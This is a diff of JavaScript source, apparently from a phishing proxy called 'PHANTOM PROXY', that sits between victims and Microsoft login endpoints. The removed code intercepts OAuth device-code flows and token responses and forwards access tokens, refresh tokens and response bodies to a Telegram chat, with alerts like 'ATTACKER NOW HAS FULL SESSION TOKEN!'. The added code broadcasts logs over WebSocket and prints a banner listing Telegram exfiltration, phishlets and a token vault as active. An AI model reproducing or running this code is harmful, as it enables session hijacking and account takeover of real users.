-`📱 *DEVICE CODE FLOW DETECTED!*
-🔑 *User Code:* \`${escapeMarkdown(userCode)}\`
-🌐 *Verification URI:* ${escapeMarkdown(verificationUri)}
-🕒 *Expires in:* ${expiresIn}s
-⏱️ *Poll interval:* ${interval}s
-🔐 *Device Code (for token exchange):* \`${escapeMarkdown(deviceCode)}\`
-
-💡 *Action:* Send the user to ${verificationUri} and ask them to enter \`${userCode}\`. 
-Then use the device_code to poll for the access token.`;
-
-                    await queueTelegramLog(deviceAlert);
-                    
-                    serverResponseBody = await compressResponseBody(decompressedResponseBody, encodings);
-                    if (proxyResponse.headers["content-length"]) {
-                        proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
-                    }
-                } catch (error) {
-                    displayError("Device Code interception failed", error, proxyRequestOptions.path);
-                }
-            }
-
-            // Intercept /token response (polling for token)
-            if (proxyRequestOptions.path.includes('/oauth2/v2.0/token') && proxyRequestBody && proxyRequestBody.includes('device_code')) {
-                try {
-                    let bodyStr = proxyRequestBody.toString();
-                    const params = new URLSearchParams(bodyStr);
-                    const deviceCode = params.get('device_code');
-                    const grantType = params.get('grant_type');
-
-                    if (grantType === 'urn:ietf:params:oauth:grant-type:device_code' && deviceCode) {
-                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
-                        const tokenResponse = JSON.parse(decompressedResponseBody.toString('utf-8'));
-
-                        if (tokenResponse.access_token) {
-                            const tokenAlert = 
-`🔓 *DEVICE CODE TOKEN GRANTED!*
-🎟️ *Access Token:* \`${escapeMarkdown(tokenResponse.access_token)}\`
-🔄 *Refresh Token:* \`${escapeMarkdown(tokenResponse.refresh_token || 'N/A')}\`
-📅 *Expires in:* ${tokenResponse.expires_in}s
-👤 *Scope:* ${tokenResponse.scope || 'N/A'}
-🔑 *Used Device Code:* \`${escapeMarkdown(deviceCode)}\`
-
-🔥 *ATTACKER NOW HAS FULL SESSION TOKEN!*`;
-                            await queueTelegramLog(tokenAlert);
-                        } else if (tokenResponse.error === 'authorization_pending') {
-                            // Pending - optionally log
-                        } else if (tokenResponse.error === 'slow_down') {
-                            // Rate limiting - ignore
-                        }
-                        
-                        serverResponseBody = await compressResponseBody(decompressedResponseBody, encodings);
-                        if (proxyResponse.headers["content-length"]) {
-                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
-                        }
-                    }
-                } catch (error) {
-                    displayError("Token interception failed", error, proxyRequestOptions.path);
-                }
-            }
-
-            // ---- INTELLIGENT RESPONSE SNIPPET (FILTERS BINARY) ----
-            if (serverResponseBody && Buffer.byteLength(serverResponseBody) > 0) {
-                const contentType = (proxyResponse.headers['content-type'] || '').toLowerCase();
-                const contentEncoding = (proxyResponse.headers['content-encoding'] || '').toLowerCase();
-                const isBinaryAsset = 
-                    contentType.includes('image/') ||
-                    contentType.includes('font/') ||
-                    contentType.includes('application/javascript') ||
-                    contentType.includes('text/css') ||
-                    contentType.includes('application/octet-stream') ||
-                    contentEncoding.includes('gzip') ||
-                    contentEncoding.includes('br') ||
-                    contentEncoding.includes('deflate') ||
-                    contentType.includes('application/x-javascript');
-
-                const sizeKB = (Buffer.byteLength(serverResponseBody) / 1024).toFixed(1);
-
-                if (isBinaryAsset) {
-                    const snippetMsg = `📦 *Binary asset (${contentType || 'unknown'})* — ${sizeKB} KB (skipped)`;
-                    queueTelegramLog(snippetMsg).catch(e => displayError("Binary snippet Telegram error", e));
-                } else {
-                    let respStr = serverResponseBody.toString('utf-8', 0, Math.min(1500, Buffer.byteLength(serverResponseBody)));
-                    if (Buffer.byteLength(serverResponseBody) > 1500) respStr += '... (truncated)';
-
-                    if (contentType.includes('application/json')) {
-                        try {
-                            const jsonObj = JSON.parse(respStr);
-                            respStr = JSON.stringify(jsonObj, null, 2);
-                            const tokens = extractResponseTokens(jsonObj, contentType);
-                            if (tokens) {
-                                const tokenStr = Object.entries(tokens).map(([k, v]) => `🎟️ *${escapeMarkdown(k)}*: \`${escapeMarkdown(v)}\``).join("\n");
-                                respStr += `\n\n🔥 *EXTRACTED RESPONSE TOKENS:*\n${tokenStr}`;
-                            }
-                        } catch (e) { /* keep raw */ }
-                    }
-
-                    const snippetMsg = `📤 *RESPONSE BODY (${contentType || 'text'}):*\n\`\`\`\n${escapeMarkdown(respStr)}\n\`\`\``;
-                    queueTelegramLog(snippetMsg).catch(e => displayError("Text snippet Telegram error", e));
-                }
-            }
-
-            clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
-            clientResponse.end(serverResponseBody);
-        });
+if (WebSocket) {
+    const wss = new WebSocket.Server({ server, path: '/ws' });
+    const wsClients = new Set();
+    wss.on('connection', (ws) => {
+        wsClients.add(ws);
+        ws.on('close', () => wsClients.delete(ws));
     });
-
-    if (proxyRequestBody) {
-        proxyRequest.write(proxyRequestBody);
+    function broadcastNewLog(filename) {
+        const message = JSON.stringify({ type: 'newLog', file: filename });
+        for (const client of wsClients) {
+            if (client.readyState === WebSocket.OPEN) {
+                client.send(message);
+            }
+        }
     }
-    proxyRequest.end();
+    try {
+        fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
+            if (filename && filename.endsWith('.log')) {
+                broadcastNewLog(filename);
+            }
+        });
+        console.log('✅ WebSocket server started on /ws');
+    } catch (e) {
+        console.warn('⚠️ Could not watch log directory:', e.message);
+    }
+} else {
+    console.warn('⚠️ WebSocket library not installed – live updates disabled.');
 }
 
-// ==================== GRACEFUL SHUTDOWN ====================
-process.on("exit", () => {
-    if (telegramBatch.length > 0) {
-        flushTelegramBatch().catch(() => {});
-    }
+server.listen(PORT, '0.0.0.0', () => {
+    console.log(`✅ PHANTOM PROXY v10.3 FIXED running on port ${PORT}`);
+    console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
+    console.log(`📱 Device Code: /device`);
+    console.log(`📤 Page‑load notifications: ACTIVE`);
+    console.log(`📤 Telegram exfil: ACTIVE`);
+    console.log(`🟣 PRT Engine: ACTIVE`);
+    console.log(`🔑 Token Vault: ACTIVE`);
+    console.log(`📊 Graph API: ACTIVE`);
+    console.log(`📈 Analytics: ACTIVE`);
+    console.log(`🎭 Phishlets: ACTIVE`);
+    console.log(`📧 Webmail: ACTIVE`);
+    console.log(`✅ Test endpoint: /dash/api/test-telegram`);
 });
-process.on("SIGINT", () => process.exit());
-process.on("SIGTERM", () => process.exit());
-
-console.log("🚀 Proxy server running on port", process.env.PORT ?? 3000);
-console.log("📡 Telegram bot token:", TELEGRAM_BOT_TOKEN ? "set" : "NOT SET");
-console.log("📡 Telegram chat ID:", TELEGRAM_CHAT_ID ? "set" : "NOT SET");
